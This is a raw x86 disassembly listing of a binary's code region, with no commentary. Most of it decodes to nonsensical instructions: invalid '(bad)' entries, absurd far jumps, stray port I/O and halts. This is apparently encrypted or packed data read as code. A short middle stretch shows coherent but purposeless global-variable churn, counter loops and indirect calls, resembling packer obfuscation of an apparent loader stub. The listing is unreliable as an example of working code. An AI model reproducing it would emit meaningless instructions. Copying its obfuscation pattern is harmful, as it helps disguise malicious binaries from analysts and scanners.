  41380f:	scas   al,BYTE PTR es:[edi]
  413810:	push   ebx
  413811:	gs das 
  413813:	or     ebx,DWORD PTR [edi-0x6c8a5e15]
  413819:	mov    edx,DWORD PTR [edx+0x176e2163]
  41381f:	mov    ebp,0x92c2b602
  413824:	mov    ecx,0x917f09d
  413829:	xor    al,0x65
  41382b:	inc    eax
  41382c:	scas   eax,DWORD PTR es:[edi]
  41382d:	jmp    0xb251:0xeb451285
  413834:	jbe    0x4137e3
  413836:	inc    ebx
  413837:	mov    ebx,0xb0b0fe5d
  41383c:	and    dh,BYTE PTR [edi-0xe1d63fa]
  413842:	fstp   QWORD PTR [edi]
  413844:	push   eax
  413845:	jnp    0x4137dc
  413847:	nop
  413848:	xor    eax,0x88824e58
  41384d:	ins    DWORD PTR es:[edi],dx
  41384e:	pop    eax
  41384f:	xor    eax,ecx
  413851:	pop    ebx
  413852:	mov    eax,0x29100900
  413857:	call   0xe0057a6
  41385c:	jge    0x41387b
  41385e:	adc    eax,0xd823dc89
  413863:	ret    
  413864:	sbb    dh,BYTE PTR [eax]
  413866:	push   ss
  413867:	jmp    0xb3733f3e
  41386c:	and    BYTE PTR [edi-0x5d],dl
  41386f:	jae    0x41389e
  413871:	xor    DWORD PTR [edx-0x55566fba],esp
  413877:	push   ebp
  413878:	in     eax,0xed
  41387a:	add    BYTE PTR [esi+ebx*4+0x7816c824],bh
  413881:	fwait
  413882:	and    BYTE PTR [eax-0x186b3c4f],dh
  413888:	icebp  
  413889:	ja     0x4138a6
  41388b:	pop    es
  41388c:	hlt    
  41388d:	bound  edx,QWORD PTR [ebx]
  41388f:	stc    
  413890:	jge    0x4138a6
  413892:	aaa    
  413893:	add    bl,0xd3
  413896:	adc    BYTE PTR [ecx],bh
  413898:	mov    ds:0x70430a57,al
  41389d:	add    ebx,edi
  41389f:	sar    DWORD PTR [eax-0x630ebfa0],cl
  4138a5:	inc    esp
  4138a6:	stos   BYTE PTR es:[edi],al
  4138a7:	sub    esp,DWORD PTR [edi]
  4138a9:	push   0x75
  4138ab:	(bad)  
  4138ac:	and    esp,eax
  4138ae:	push   edx
  4138af:	xor    eax,0x3cb5836
  4138b4:	arpl   WORD PTR [ebx],si
  4138b6:	jnp    0x4138a3
  4138b8:	xchg   DWORD PTR [edx],eax
  4138ba:	data16 jnp 0x41392c
  4138bd:	out    dx,eax
  4138be:	inc    esp
  4138bf:	sub    eax,0x24b31a72
  4138c4:	clc    
  4138c5:	fwait
  4138c6:	cwde   
  4138c7:	inc    esi
  4138c8:	mov    dl,0x6b
  4138ca:	push   ds
  4138cb:	loope  0x41388e
  4138cd:	inc    esp
  4138ce:	xchg   edi,eax
  4138cf:	xchg   DWORD PTR [ecx],ebp
  4138d1:	sub    eax,0xa532b5ac
  4138d6:	retf   
  4138d7:	xor    eax,DWORD PTR [eax+0x8]
  4138da:	pop    edi
  4138db:	pop    edi
  4138dc:	mov    esp,0x1f9c951b
  4138e1:	popf   
  4138e2:	loop   0x41395d
  4138e4:	outs   dx,DWORD PTR ds:[esi]
  4138e5:	dec    esp
  4138e6:	and    DWORD PTR [ecx+ebx*1-0x6f9ebbfc],ebx
  4138ed:	ins    BYTE PTR es:[edi],dx
  4138ee:	adc    BYTE PTR [ecx-0x7d],bh
  4138f1:	dec    edx
  4138f2:	cmp    al,0xef
  4138f4:	xlat   BYTE PTR ds:[ebx]
  4138f5:	jb     0x4138cf
  4138f7:	sub    al,BYTE PTR [ebx]
  4138f9:	dec    esi
  4138fa:	pop    edx
  4138fb:	xor    edi,DWORD PTR [edi]
  4138fd:	mov    esp,0xddf6a79c
  413902:	and    esp,edi
  413904:	cmp    edx,edi
  413906:	cmp    BYTE PTR [edi],bl
  413908:	or     eax,0x7354b5bd
  41390d:	scas   al,BYTE PTR es:[edi]
  41390e:	aaa    
  41390f:	nop
  413910:	(bad)  
  413912:	sbb    BYTE PTR [edx+0x43],ch
  413915:	push   ss
  413916:	mov    ebp,0x81c442a1
  41391b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41391c:	ret    0xd3f1
  41391f:	add    eax,0x7768e628
  413924:	scas   al,BYTE PTR es:[edi]
  413925:	pop    eax
  413926:	jl     0x41394c
  413928:	(bad)  
  41392a:	push   ecx
  41392b:	shr    BYTE PTR [ebp-0x5eaf999b],0xff
  413932:	lods   al,BYTE PTR ds:[esi]
  413933:	arpl   WORD PTR [edx+0x2f5046ee],di
  413939:	xor    DWORD PTR [eax],edx
  41393b:	repz jae 0x4139b2
  41393e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41393f:	xchg   DWORD PTR [ebp-0x4eac5a62],edi
  413945:	mov    edx,0x7d83fcb0
  41394a:	jmp    0xd4c4f45f
  41394f:	sub    eax,0xfc542b31
  413954:	aad    0xf3
  413956:	popa   
  413957:	test   al,0xd5
  413959:	lods   al,BYTE PTR ds:[esi]
  41395a:	lea    ecx,[ebx+0x6f]
  41395d:	adc    eax,0xc1d32b39
  413962:	sub    edx,DWORD PTR [ebx]
  413964:	mov    al,ds:0x768e3452
  413969:	push   cs
  41396a:	dec    edx
  41396b:	sbb    cl,BYTE PTR [ecx-0x35bfc0eb]
  413971:	popa   
  413972:	fldcw  WORD PTR [edi+0x744ac0e6]
  413978:	push   esi
  413979:	push   ss
  41397a:	mov    eax,0xce428db6
  41397f:	mov    al,0xf5
  413981:	lods   al,BYTE PTR ds:[esi]
  413982:	sub    eax,eax
  413984:	je     0x41395d
  413986:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413987:	in     al,0x4d
  413989:	div    ebp
  41398b:	xchg   esp,eax
  41398c:	xchg   esp,eax
  41398d:	cli    
  41398e:	mov    dh,0xd5
  413990:	jmp    0xcfd7:0x730d7420
  413997:	ins    DWORD PTR es:[edi],dx
  413998:	stc    
  413999:	or     al,BYTE PTR [ecx-0x49]
  41399c:	jae    0x413a04
  41399e:	push   ecx
  41399f:	and    dl,dh
  4139a1:	and    edx,DWORD PTR [esi]
  4139a3:	sbb    ebp,DWORD PTR [ecx+0x11]
  4139a6:	paddq  mm0,QWORD PTR [ebp+0x20e2ac08]
  4139ad:	sub    edi,DWORD PTR [ebp-0x60dc2024]
  4139b3:	test   DWORD PTR [eiz*2-0x7711c6e9],ecx
  4139ba:	xor    ecx,edx
  4139bc:	lds    esi,FWORD PTR [eax+0xe]
  4139bf:	jmp    FWORD PTR [ebx+0x1766042a]
  4139c5:	push   ebx
  4139c6:	dec    ebx
  4139c7:	ficom  WORD PTR [eax+0x22cca2e]
  4139cd:	mov    edx,0x28f45765
  4139d2:	retf   0xc92f
  4139d5:	dec    esi
  4139d6:	adc    BYTE PTR [ebx-0x2e],ah
  4139d9:	inc    ebp
  4139da:	mov    DWORD PTR [esi-0xe758a5],ecx
  4139e0:	sti    
  4139e1:	xor    eax,0x56e4da2b
  4139e6:	dec    esp
  4139e7:	cli    
  4139e8:	xor    esi,DWORD PTR [ecx]
  4139ea:	loop   0x4139eb
  4139ec:	into   
  4139ed:	pop    ebp
  4139ee:	int    0xcd
  4139f0:	and    eax,0xddb305f7
  4139f5:	nop
  4139f6:	into   
  4139f7:	neg    DWORD PTR [ecx+0x6e1872f6]
  4139fd:	test   al,0xc7
  413a00:	inc    ecx
  413a01:	div    DWORD PTR [ebp-0x5015122d]
  413a07:	push   esi
  413a08:	push   ds
  413a09:	lahf   
  413a0a:	lds    ebp,FWORD PTR [ebx+edi*8]
  413a0d:	mov    ebp,0x85dbc895
  413a12:	cld    
  413a13:	call   0x41ba07a2
  413a18:	pushw  0x9319
  413a1c:	call   0x38f2:0x8a4398b4
  413a23:	mov    dh,BYTE PTR [eax+ebp*1]
  413a26:	out    0x5f,al
  413a28:	in     eax,0x78
  413a2a:	sbb    esp,ebp
  413a2c:	das    
  413a2d:	(bad)  [ebx-0x653e403b]
  413a33:	in     eax,dx
  413a34:	mov    eax,ds:0xc4d609a
  413a39:	out    dx,eax
  413a3a:	mov    WORD PTR [ecx+0x1cd09e42],?
  413a40:	jb     0x4139d6
  413a42:	sbb    al,0xa1
  413a44:	cwde   
  413a45:	xor    eax,0x58556a37
  413a4a:	cmp    bh,ah
  413a4c:	push   0xddcd9875
  413a51:	call   0x40f7cd
  413a56:	jmp    0x413d3a
  413a5b:	pop    ebx
  413a5c:	ins    DWORD PTR es:[edi],dx
  413a5d:	and    al,0xa9
  413a5f:	xor    dh,BYTE PTR [ecx+0x71]
  413a62:	ins    DWORD PTR es:[edi],dx
  413a63:	jp     0x413a20
  413a65:	or     esi,ecx
  413a67:	and    ch,BYTE PTR [eax+eiz*8+0x4b]
  413a6b:	jle    0x413ad5
  413a6d:	jo     0x413adf
  413a6f:	mov    ecx,0xe70707e
  413a74:	xor    ebp,DWORD PTR [edi]
  413a76:	mov    esi,0xfb707b13
  413a7b:	cmp    DWORD PTR [ebp-0x74],0xffffffef
  413a7f:	mov    al,0xeb
  413a81:	jo     0x413a64
  413a83:	add    eax,ebx
  413a85:	ins    DWORD PTR es:[edi],dx
  413a86:	lock push 0xa0678885
  413a8c:	fstp   TBYTE PTR [eax-0x11]
  413a8f:	jmp    0x3d10:0xad15d6da
  413a96:	rcl    BYTE PTR [eax-0x22773eea],1
  413a9c:	add    ecx,ebp
  413a9e:	retf   
  413a9f:	mov    al,ds:0xa6e3aa30
  413aa4:	pushf  
  413aa5:	hlt    
  413aa6:	sar    BYTE PTR [esi],cl
  413aa8:	data16 xor al,0x8c
  413aab:	xor    eax,0xfcb32951
  413ab0:	xchg   esi,eax
  413ab1:	stos   BYTE PTR es:[edi],al
  413ab2:	push   ebp
  413ab3:	icebp  
  413ab4:	lods   eax,DWORD PTR fs:[esi]
  413ab6:	mov    al,ds:0xae72e49b
  413abb:	cwde   
  413abc:	jmp    0x4d000e4e
  413ac1:	fild   WORD PTR [ebp-0x52a2a77]
  413ac7:	fcmovnb st,st(1)
  413ac9:	lock inc esi
  413acb:	dec    edx
  413acc:	push   ebp
  413acd:	push   ds
  413ace:	jp     0x413a78
  413ad0:	sub    al,cl
  413ad2:	mov    ds:0x18112fe3,eax
  413ad7:	ret    0x9d1e
  413ada:	mov    esi,0xff22cc0f
  413adf:	add    al,0x7f
  413ae1:	into   
  413ae2:	adc    BYTE PTR [ecx+0x4b],0x95
  413ae6:	cs adc eax,0x22388b90
  413aec:	es jmp 0xcc29:0x257592c0
  413af4:	sti    
  413af5:	in     al,0x1b
  413af7:	add    eax,0x860cfce1
  413afc:	(bad)  
  413afd:	stos   BYTE PTR es:[edi],al
  413afe:	sti    
  413aff:	fldln2 
  413b01:	mov    dh,0xf4
  413b03:	mov    esp,0x7985323
  413b08:	mov    dl,0x9f
  413b0a:	aam    0x16
  413b0c:	shl    BYTE PTR [esi+eiz*1+0xbe6b7b2],cl
  413b13:	pop    esi
  413b14:	or     ch,BYTE PTR [eax+0x71b8e46e]
  413b1a:	jae    0x413b41
  413b1c:	cwde   
  413b1d:	add    BYTE PTR [ebx+0x4b2d706b],ch
  413b23:	aaa    
  413b24:	xchg   ebx,eax
  413b25:	ret    
  413b26:	adc    edx,ebp
  413b28:	fild   DWORD PTR [esi-0x2140eed7]
  413b2e:	not    cl
  413b30:	(bad)  
  413b31:	shr    ch,1
  413b33:	jl     0x413ac2
  413b35:	push   edx
  413b36:	sub    eax,0xd90b97ba
  413b3b:	(bad)  
  413b3c:	cwde   
  413b3d:	dec    esi
  413b3e:	shl    ecx,0x3
  413b41:	pusha  
  413b42:	mov    esi,0xa8470c71
  413b47:	mov    al,0x8f
  413b49:	sub    DWORD PTR ds:0xfdd8c019,0x6
  413b50:	dec    edx
  413b51:	sbb    BYTE PTR [eax],cl
  413b53:	mov    ds:0xcd944dd1,eax
  413b58:	sti    
  413b59:	aas    
  413b5a:	sub    al,0x8a
  413b5c:	pop    ebp
  413b5d:	lds    ebp,FWORD PTR [ecx]
  413b5f:	cmp    BYTE PTR [esi],dl
  413b61:	push   cs
  413b62:	sub    al,0xf
  413b64:	(bad)  
  413b65:	std    
  413b66:	sub    eax,0x7a3f2852
  413b6b:	pop    ss
  413b6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b6d:	mov    cl,0x45
  413b6f:	jecxz  0x413b61
  413b71:	stc    
  413b72:	and    esi,DWORD PTR [ebx]
  413b74:	repz adc al,0xcc
  413b77:	stos   DWORD PTR es:[edi],eax
  413b78:	jecxz  0x413be9
  413b7a:	enter  0xe8e4,0xfd
  413b7e:	dec    ebp
  413b7f:	or     al,0xcc
  413b81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b82:	fsubrp st(7),st
  413b84:	aad    0xc8
  413b86:	ror    DWORD PTR [edx-0x49],1
  413b89:	dec    edx
  413b8a:	daa    
  413b8b:	clc    
  413b8c:	addr16 xchg ebp,eax
  413b8e:	sub    BYTE PTR [edi+0x71],ah
  413b91:	jge    0x413c09
  413b93:	sahf   
  413b94:	shl    esi,0x9b
  413b97:	or     BYTE PTR [ecx],dh
  413b99:	xchg   edi,eax
  413b9a:	inc    esi
  413b9b:	imul   BYTE PTR [ecx-0x74f56d6e]
  413ba1:	je     0x413ba4
  413ba3:	mov    DWORD PTR [esi+0x33e62d18],eax
  413ba9:	test   eax,0xb0101d57
  413bae:	fistp  DWORD PTR [edi+0x524dd8ed]
  413bb4:	jp     0x413c21
  413bb6:	imul   esi,DWORD PTR [esi],0xc59b9789
  413bbc:	mov    dl,0xfc
  413bbe:	lods   al,BYTE PTR ds:[esi]
  413bbf:	hlt    
  413bc0:	add    ebx,edi
  413bc2:	lahf   
  413bc3:	sub    bh,BYTE PTR [eax]
  413bc5:	popa   
  413bc6:	(bad)  
  413bc7:	neg    DWORD PTR ds:0xb44befed
  413bcd:	loope  0x413c0e
  413bcf:	enter  0x5366,0xd8
  413bd3:	xchg   ecx,eax
  413bd4:	ja     0x413c07
  413bd6:	(bad)  
  413bd7:	xor    eax,0x5f59d494
  413bdc:	sbb    esi,DWORD PTR [eax+0x57e75727]
  413be2:	rcr    al,cl
  413be4:	scas   eax,DWORD PTR es:[edi]
  413be5:	int    0xd0
  413be7:	sar    BYTE PTR [edx+0x22],cl
  413bea:	push   ebp
  413beb:	push   ebx
  413bec:	es int3 
  413bee:	cmp    bh,BYTE PTR [esi-0xda3704c]
  413bf4:	and    al,0xa0
  413bf6:	mov    ecx,0x82bd6c2c
  413bfb:	jb     0x413ba0
  413bfd:	jae    0x413ba5
  413bff:	outs   dx,DWORD PTR ds:[esi]
  413c00:	les    edx,FWORD PTR [esi+0x64]
  413c03:	xor    ch,BYTE PTR [ebp-0x68]
  413c06:	std    
  413c07:	mov    dl,0x64
  413c09:	or     ah,al
  413c0b:	dec    esp
  413c0c:	call   0xf624:0xe5f7ac8f
  413c13:	imul   ebx,eax,0x6e4b92fd
  413c19:	loopne 0x413c75
  413c1b:	test   BYTE PTR [edx],bl
  413c1d:	bound  ebp,QWORD PTR [ebx+0x7bbfa9de]
  413c23:	iret   
  413c24:	pop    esp
  413c25:	div    BYTE PTR [ebx+0x3d]
  413c28:	jmp    0xfd63e769
  413c2d:	pop    esp
  413c2e:	jne    0x413c14
  413c30:	or     BYTE PTR [ebp-0x472b1095],0x8f
  413c37:	inc    DWORD PTR [edx-0x444d8f25]
  413c3d:	mov    ebx,0x64296eb9
  413c42:	pusha  
  413c43:	scas   al,BYTE PTR es:[edi]
  413c44:	bound  ecx,QWORD PTR [ecx-0x23]
  413c47:	jbe    0x413c33
  413c49:	cdq    
  413c4a:	div    BYTE PTR [eax+eax*4]
  413c4d:	ins    BYTE PTR es:[edi],dx
  413c4e:	dec    eax
  413c4f:	xchg   esp,eax
  413c50:	jo     0x413c7e
  413c52:	jecxz  0x413cc8
  413c54:	push   ecx
  413c55:	ud2    
  413c57:	leave  
  413c58:	test   al,0x93
  413c5a:	xchg   ebx,eax
  413c5b:	or     ch,BYTE PTR [edi]
  413c5d:	or     BYTE PTR [ebp-0x6e],0xa1
  413c61:	lea    esp,[ebp-0x61]
  413c64:	inc    edi
  413c65:	and    bl,BYTE PTR [ebx]
  413c67:	stc    
  413c68:	jbe    0x413beb
  413c6a:	mov    dh,0xce
  413c6c:	sti    
  413c6d:	sbb    al,0xcc
  413c6f:	push   cs
  413c70:	jmp    0x8413a580
  413c75:	sahf   
  413c76:	in     eax,dx
  413c77:	adc    eax,DWORD PTR [eax]
  413c79:	push   ebp
  413c7a:	adc    BYTE PTR [ecx-0x11],dh
  413c7d:	pop    edi
  413c7e:	or     al,0x3b
  413c80:	(bad)  
  413c81:	fcmovnb st,st(1)
  413c83:	push   es
  413c84:	push   esi
  413c85:	pop    es
  413c86:	arpl   WORD PTR [esi+ebp*2+0x44],ax
  413c8a:	stc    
  413c8b:	push   0xfaeac272
  413c90:	pop    ss
  413c91:	call   0x7fe3:0xa472d510
  413c98:	ss stc 
  413c9a:	in     eax,dx
  413c9b:	or     ecx,DWORD PTR [ebx-0x83bd875]
  413ca1:	fs repnz and al,0x5a
  413ca5:	cmp    bh,BYTE PTR [edx-0x3690e93e]
  413cab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cac:	push   ecx
  413cad:	or     edx,ebx
  413caf:	add    ebp,DWORD PTR [edx+0x72]
  413cb2:	popa   
  413cb3:	nop
  413cb4:	rol    ah,1
  413cb6:	pusha  
  413cb7:	add    BYTE PTR [edx-0x63],ch
  413cba:	and    BYTE PTR [ecx+0x71e9df8c],0x60
  413cc1:	push   ds
  413cc2:	cwde   
  413cc3:	(bad)  
  413cc4:	xor    eax,0xb50816b
  413cc9:	xchg   edi,eax
  413cca:	data16 or dl,0x8c
  413cce:	in     eax,dx
  413ccf:	pop    ebx
  413cd0:	jns    0x413cf1
  413cd2:	fidivr WORD PTR [ecx+eax*1-0x40]
  413cd6:	data16 lods al,BYTE PTR ds:[esi]
  413cd8:	mov    bh,0xca
  413cda:	jmp    0x49e4:0x43e0fe35
  413ce1:	push   esi
  413ce2:	jle    0x413c77
  413ce4:	adc    dl,al
  413ce6:	jmp    0x3413:0x9be284b1
  413ced:	pusha  
  413cee:	pop    DWORD PTR [edx]
  413cf0:	cmp    ebp,DWORD PTR ds:0x69a548db
  413cf6:	nop
  413cf7:	mov    bh,0x2f
  413cf9:	in     eax,dx
  413cfa:	in     eax,0x9e
  413cfc:	push   cs
  413cfd:	add    edx,DWORD PTR [edi]
  413cff:	mov    bh,0x8e
  413d01:	lahf   
  413d02:	jg     0x413cb9
  413d04:	push   edx
  413d05:	aas    
  413d06:	xchg   ebp,eax
  413d07:	scas   al,BYTE PTR es:[edi]
  413d08:	mov    ebx,0x8148fa2c
  413d0d:	stc    
  413d0e:	popa   
  413d0f:	hlt    
  413d10:	mov    ch,0xe4
  413d12:	and    al,0x47
  413d14:	pop    esi
  413d15:	xor    DWORD PTR [ebp-0x42d75c72],esp
  413d1b:	cmp    bl,BYTE PTR [edx]
  413d1d:	out    0x6f,eax
  413d1f:	out    dx,al
  413d20:	xor    BYTE PTR [esi+0x765fa4a8],ch
  413d26:	out    0xa7,eax
  413d28:	ficomp DWORD PTR [edx+ebp*1+0x603c4922]
  413d2f:	mov    al,ds:0xf4da6dad
  413d34:	mov    esp,0x4d13cfeb
  413d39:	dec    DWORD PTR [ecx+0x458be045]
  413d3f:	cld    
  413d40:	sub    ecx,ecx
  413d42:	mov    ecx,DWORD PTR [ebp-0x20]
  413d45:	mov    DWORD PTR ds:0x42e7ff,0x1b
  413d4f:	cmp    DWORD PTR ds:0x42e7ff,0x0
  413d56:	je     0x413dab
  413d5c:	cmp    DWORD PTR ds:0x42e7ff,0x2
  413d63:	jne    0x413d7f
  413d69:	push   DWORD PTR [ebp-0xc]
  413d6c:	push   0x52a1
  413d71:	push   0x824e
  413d76:	push   DWORD PTR [ebp-0x18]
  413d79:	call   DWORD PTR ds:0x42e66b
  413d7f:	cmp    DWORD PTR ds:0x42e7ff,0x3
  413d86:	jne    0x413d99
  413d8c:	mov    esi,DWORD PTR ds:0x42e7ff
  413d92:	dec    esi
  413d93:	mov    DWORD PTR ds:0x42e7ff,esi
  413d99:	mov    esi,DWORD PTR ds:0x42e7ff
  413d9f:	dec    esi
  413da0:	mov    DWORD PTR ds:0x42e7ff,esi
  413da6:	jmp    0x413d4f
  413dab:	mov    esi,0x7510855
  413db0:	or     DWORD PTR ds:0x42e80f,0x42fe86
  413dba:	xor    eax,esi
  413dbc:	add    eax,ebx
  413dbe:	cmp    ecx,eax
  413dc0:	mov    DWORD PTR ds:0x42e22c,0x588b
  413dca:	je     0x414b4e
  413dd0:	push   DWORD PTR [ebp-0x20]
  413dd3:	dec    DWORD PTR ds:0x42e7f7
  413dd9:	push   DWORD PTR [ebp+0x8]
  413ddc:	xor    DWORD PTR ds:0x42fdd9,0x42e220
  413de6:	call   0x405485
  413deb:	mov    DWORD PTR [ebp-0x14],eax
  413dee:	and    DWORD PTR ds:0x42e7fb,0x0
  413df8:	jmp    0x413e08
  413dfd:	mov    eax,ds:0x42e7fb
  413e02:	inc    eax
  413e03:	mov    ds:0x42e7fb,eax
  413e08:	cmp    DWORD PTR ds:0x42e7fb,0x10
  413e0f:	jae    0x413e33
  413e15:	cmp    DWORD PTR ds:0x42e7fb,0x16
  413e1c:	jne    0x413e28
  413e22:	call   DWORD PTR ds:0x42e58b
  413e28:	jmp    0x413dfd
  413e2d:	sub    DWORD PTR ds:0x42fe01,ecx
  413e33:	mov    eax,DWORD PTR [ebp-0x4]
  413e36:	or     DWORD PTR ds:0x42e7f7,edx
  413e3c:	mov    ecx,DWORD PTR [ebp-0x14]
  413e3f:	adc    DWORD PTR ds:0x42fe8a,0x2715
  413e49:	xor    eax,esi
  413e4b:	dec    DWORD PTR ds:0x42e803
  413e51:	add    eax,ebx
  413e53:	mov    DWORD PTR ds:0x42e21c,0x499a
  413e5d:	cmp    ecx,eax
  413e5f:	je     0x414b4e
  413e65:	not    eax
  413e67:	mov    eax,DWORD PTR [ebp-0x14]
  413e6a:	mov    eax,DWORD PTR [eax+0x18]
  413e6d:	mov    DWORD PTR [ebp-0x20],eax
  413e70:	xor    DWORD PTR ds:0x42e7fb,0x4f5
  413e7a:	jmp    0x41415e
  413e7f:	lods   al,BYTE PTR ds:[esi]
  413e80:	mov    WORD PTR [edx],gs
  413e82:	loopne 0x413eae
  413e84:	outs   dx,BYTE PTR ds:[esi]
  413e85:	push   0x4c
  413e87:	repz push edi
  413e89:	scas   eax,DWORD PTR es:[edi]
  413e8a:	vpcomud xmm8,xmm2,xmm2,0x47
  413e90:	jbe    0x413f02
  413e92:	jo     0x413e4d
  413e94:	jle    0x413f06
  413e96:	jo     0x413e86
  413e98:	pop    edx
  413e99:	adc    DWORD PTR [ecx+0x1a34eb6b],0x30
  413ea0:	not    bl
  413ea2:	jo     0x413eea
  413ea4:	fs jecxz 0x413f1a
  413ea7:	jmp    0xf611b8f5
  413eac:	lahf   
  413ead:	mov    BYTE PTR [edx+0xb8cc347],dl
  413eb3:	inc    DWORD PTR [edx+0x5745ef7d]
  413eb9:	pop    edi
  413eba:	neg    BYTE PTR [ecx+0x77]
  413ebd:	bound  eax,QWORD PTR [eax]
  413ebf:	mov    ah,0xb1
  413ec1:	fnstsw WORD PTR [ebp+0x49cf4ee9]
  413ec7:	test   eax,0x2a9981ee
  413ecc:	imul   ebx,DWORD PTR [esi-0x45],0xfde7912b
  413ed3:	xor    dl,BYTE PTR [ebp+0x2f]
  413ed6:	adc    DWORD PTR [edi-0x17],edx
  413ed9:	out    0x78,eax
  413edb:	test   BYTE PTR [edi+0x73f51ec1],bh
  413ee1:	xchg   ecx,eax
  413ee2:	add    bl,BYTE PTR fs:0x7848
  413ee8:	mov    ds:0x204e9857,eax
  413eed:	xchg   ebp,eax
  413eee:	rcr    al,0x98
  413ef1:	cld    
  413ef2:	xchg   esi,eax
  413ef3:	and    cl,BYTE PTR [eax]
  413ef5:	(bad)  
  413ef6:	push   ebp
  413ef7:	and    ebp,edx
  413ef9:	addr16 in al,dx
  413efb:	sbb    esp,DWORD PTR [esi+0x55e846b2]
  413f01:	xchg   ebp,eax
  413f02:	sbb    BYTE PTR [edi],0xdc
  413f05:	mov    dl,0xe4
  413f07:	dec    BYTE PTR [ecx+0x60]
  413f0a:	pop    esi
  413f0b:	ja     0x413f3e
  413f0d:	(bad)  
  413f0e:	out    0xb3,al
  413f10:	lahf   
  413f11:	stos   DWORD PTR es:[edi],eax
  413f12:	add    eax,0x319dfb95
  413f17:	and    bl,BYTE PTR [ebp-0xb]
  413f1a:	out    0x1f,eax
  413f1c:	retf   
  413f1d:	pop    ss
  413f1e:	fdivr  st,st(5)
  413f20:	data16 js 0x413f90
  413f23:	pop    es
  413f24:	sti    
  413f25:	dec    ebp
  413f26:	int3   
  413f27:	sti    
  413f28:	mov    ch,BYTE PTR [ebp+0x4544b318]
  413f2e:	jnp    0x413f36
  413f30:	nop
  413f31:	mov    dl,0xdb
  413f33:	jbe    0x413f27
  413f35:	and    eax,0xa48ccf08
  413f3a:	jp     0x413f5e
  413f3c:	test   eax,0x7eec656a
  413f41:	adc    al,0xc4
  413f43:	xlat   BYTE PTR ds:[ebx]
  413f44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f45:	sub    ebp,DWORD PTR [ebp-0x4d]
  413f48:	(bad)  
  413f4a:	and    al,0xd8
  413f4c:	je     0x413ed7
  413f4e:	int3   
  413f4f:	mov    al,ds:0x3be13a22
  413f54:	cwde   
  413f55:	sub    eax,DWORD PTR [edi+0x1ce37788]
  413f5b:	push   edi
  413f5c:	bound  ebx,QWORD PTR [ebx-0x114361f2]
  413f62:	xor    ebx,DWORD PTR [ebx+0x25]
  413f65:	cs pop esi
  413f67:	clc    
  413f68:	stos   BYTE PTR es:[edi],al
  413f69:	jge    0x413f2f
  413f6b:	cmp    BYTE PTR [esi+0x766e72c4],ah
  413f71:	dec    esp
  413f72:	out    dx,al
  413f73:	sar    DWORD PTR [edi+0x5154611e],0x79
  413f7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f7b:	jle    0x413fcb
  413f7d:	cli    
  413f7e:	jne    0x413fa9
  413f80:	test   al,0x47
  413f82:	pop    ss
  413f83:	iret   
  413f84:	dec    DWORD PTR [ecx+0x5d]
  413f87:	pop    DWORD PTR [ebp-0x9]
  413f8a:	out    dx,eax
  413f8b:	or     ch,BYTE PTR [ebx+0x495ca973]
  413f91:	ret    
  413f92:	xchg   esp,eax
  413f93:	jbe    0x413fd1
  413f95:	jb     0x413f58
  413f97:	je     0x413fb3
  413f99:	aas    
  413f9a:	(bad)  
  413f9b:	imul   esi,ecx,0xf2bc3edf
  413fa1:	sub    al,dl
  413fa3:	push   0xa2dfa62c
  413fa8:	dec    esi
  413fa9:	push   ds
  413faa:	rcl    BYTE PTR [esi],0xf4
  413fad:	sub    ah,al
  413faf:	adc    bh,BYTE PTR [bx+si-0x19]
  413fb3:	adc    eax,0xd9912d42
  413fb8:	xor    edx,esi
  413fba:	div    eax
  413fbc:	test   DWORD PTR [eax-0x3f],0x6eec8fd9
  413fc3:	cmp    BYTE PTR [esi+0x453d2e64],ch
  413fc9:	dec    BYTE PTR [esi+0x59a18211]
  413fcf:	aaa    
  413fd0:	hlt    
  413fd1:	inc    ecx
  413fd2:	fidivr DWORD PTR fs:[ebp-0x23]
  413fd6:	jbe    0x413f9b
  413fd8:	jmp    0xc2b2:0x29c97e6b
  413fdf:	and    al,0xb1
  413fe1:	lea    esi,[edx-0x1a]
  413fe4:	div    BYTE PTR [esi]
  413fe6:	mov    esi,0xdfd276ac
  413feb:	xor    edi,esi
  413fed:	add    DWORD PTR [edi+eax*4],edi
  413ff0:	xchg   edx,eax
  413ff1:	jp     0x41401b
  413ff3:	lods   eax,DWORD PTR ds:[esi]
  413ff4:	inc    edx
  413ff5:	mov    ds,WORD PTR [edx-0x4852b4ef]
  413ffb:	push   eax
  413ffc:	jne    0x414062
  413ffe:	sahf   
  413fff:	(bad)  
  414000:	and    al,0x40
  414002:	and    eax,0x2ea25fd7
  414007:	(bad)  
  414008:	mov    eax,0x7f82ed20
  41400d:	retf   
  41400e:	iret   
  41400f:	mov    ds:0xaf23ccd3,eax
  414014:	retf   0x892d
  414017:	jno    0x414011
  414019:	adc    bl,al
  41401b:	sub    eax,0x85b299cc
  414020:	mov    DWORD PTR [edi],edx
  414022:	es mov esp,0x9639ee5c
  414028:	xor    eax,0x18b26d49
  41402d:	(bad)  
  41402e:	jbe    0x413fb9
  414030:	dec    edx
  414031:	adc    eax,0x854c0a0f
  414036:	cmp    eax,0x365c4c53
  41403b:	stc    
  41403c:	and    al,0xa6
  41403e:	je     0x413fee
  414040:	mov    bl,0x67
  414042:	ja     0x414072
  414044:	sbb    eax,edi
  414046:	add    dl,0x60
  414049:	push   ebp
  41404a:	in     al,dx
  41404b:	cdq    
  41404c:	in     al,0x8d
  41404e:	pop    ecx
  41404f:	lahf   
  414050:	mov    al,0x3f
  414052:	mov    DWORD PTR [eax+0x56ed3909],ecx
  414058:	call   0x1549:0x8090f34b
  41405f:	mov    bh,0xd2
  414061:	pop    ss
  414062:	dec    esi
  414063:	pop    edi
  414064:	cmp    BYTE PTR [ecx-0x662da864],dl
  41406a:	push   esi
  41406b:	xchg   DWORD PTR [esi],edx
  41406d:	push   ebx
  41406e:	mov    cs:0x9caecc35,al
  414074:	sbb    esi,DWORD PTR [edi+0x54]
  414077:	imul   ecx,DWORD PTR [ecx-0xb],0x37a60c1e
  41407e:	shr    ebp,1
  414080:	xor    ah,BYTE PTR [eax+edx*2-0x57]
  414084:	or     eax,0x74bb41b5
  414089:	daa    
  41408a:	pop    ds
  41408b:	xor    dl,BYTE PTR [esi-0x5a87910a]
